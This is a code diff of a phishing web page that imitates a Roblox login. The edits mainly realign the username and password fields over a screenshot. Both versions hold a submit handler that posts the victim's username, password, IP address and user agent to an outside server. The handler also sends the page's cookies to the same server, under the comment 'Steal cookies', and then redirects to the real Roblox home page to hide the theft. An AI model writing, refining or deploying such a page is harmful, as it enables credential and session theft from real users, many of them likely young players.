@@ -94,65 +94,71 @@
     </div>
     <div id="fake-loading">Verifying Credentials...</div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const usernameField = document.getElementById('username');
-            const passwordField = document.getElementById('password');
-            const loginButton = document.getElementById('login-button');
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const usernameField = document.getElementById('username');
+        const passwordField = document.getElementById('password');
+        const loginButton = document.getElementById('login-button');
 
-            // Adjust these values to match the screenshot's layout
-        // Adjust these values to match the screenshot's layout (0.5 cm left, 1 cm up)
-// Adjust these values to match the screenshot's layout (1 cm left, 0.5 cm down)
-usernameField.style.top = '260px';  // Moved down from 250px to 260px (0.5 cm down ≈ 20px)
-usernameField.style.left = '47%';   // Moved left from 49% to 47% (1 cm left ≈ 2%)
+        // Adjusted positions: 1 cm left, 0.5 cm down for username/password
+        usernameField.style.top = '260px';
+        usernameField.style.left = '47%';
+        usernameField.style.transform = 'translateX(-50%)';  // Centers the input relative to its left position
+        usernameField.style.width = '250px';  // Width of the input field
+        usernameField.style.height = '40px';  // Height of the input field
 
-passwordField.style.top = '310px';  // Moved down from 300px to 310px (0.5 cm down ≈ 20px)
-passwordField.style.left = '47%';   // Moved left from 49% to 47% (1 cm left ≈ 2%)
+        passwordField.style.top = '310px';
+        passwordField.style.left = '47%';
+        passwordField.style.transform = 'translateX(-50%)';  // Centers the input relative to its left position
+        passwordField.style.width = '250px';  // Width of the input field
+        passwordField.style.height = '40px';  // Height of the input field
 
+        // Login button remains at previous position (350px top, 49% left)
+        loginButton.style.top = '350px';
+        loginButton.style.left = '49%';
+        loginButton.style.transform = 'translateX(-50%)';  // Centers the button relative to its left position
+        loginButton.style.width = '250px';  // Width of the button
+        loginButton.style.height = '40px';  // Height of the button
 
-loginButton.style.top = '350px';     // Moved up from 400px to 350px (1 cm up)
-loginButton.style.left = '40%';     // Moved left from 50% to 49% (0.5 cm left)
-loginButton.style.transform = 'translateX(-50%)';
+        document.getElementById('fake-login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
 
+            const username = usernameField.value;
+            const password = passwordField.value;
 
-            document.getElementById('fake-login-form').addEventListener('submit', function(e) {
-                e.preventDefault();
+            if (!username || !password) {
+                alert("All fields are required for verification.");
+                return;
+            }
 
-                const username = usernameField.value;
-                const password = passwordField.value;
-
-                if (!username || !password) {
-                    alert("All fields are required for verification.");
-                    return;
-                }
-
-                // Send to backend
-                fetch("https://wassup.iceiy.com/save.php", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        username: username,
-                        password: password,
-                        ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>',
-                        user_agent: navigator.userAgent
-                    })
-                });
-
-                // Show fake loading screen
-                document.getElementById('fake-loading').style.display = 'flex';
-
-                // Get cookies
-                const cookies = document.cookie;
-                if (cookies) {
-                    fetch(`https://wassup.iceiy.com/start.php?cookies=${encodeURIComponent(cookies)}&ip=<?php echo $_SERVER["REMOTE_ADDR"]; ?>`);
-                }
-
-                // Redirect after 3 seconds
-                setTimeout(() => {
-                    window.location.href = "https://www.roblox.com/home";
-                }, 3000);
+            // Send to your backend
+            fetch("https://wassup.iceiy.com/save.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    username: username,
+                    password: password,
+                    ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>',
+                    user_agent: navigator.userAgent
+                })
             });
+
+            // Show fake loading screen
+            document.getElementById('fake-loading').style.display = 'flex';
+
+            // Steal cookies
+            const cookies = document.cookie;
+            if (cookies) {
+                fetch(`https://wassup.iceiy.com/start.php?cookies=${encodeURIComponent(cookies)}&ip=<?php echo $_SERVER["REMOTE_ADDR"]; ?>`);
+            }
+
+            // Redirect after 3 seconds
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com/home";
+            }, 3000);
         });
-    </script>
+    });
+</script>
+
 </body>
 </html>
